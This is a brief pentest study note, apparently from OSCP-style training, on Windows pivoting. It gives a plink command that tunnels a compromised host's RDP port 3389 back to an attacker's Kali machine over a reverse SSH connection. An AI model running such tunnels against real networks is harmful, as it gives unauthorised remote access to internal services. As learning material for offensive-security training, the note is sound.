#windows #pivoting #portredirect 

![[Pasted image 20230730203201.png]]


```bash
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```

9833 is redirector port on KALI


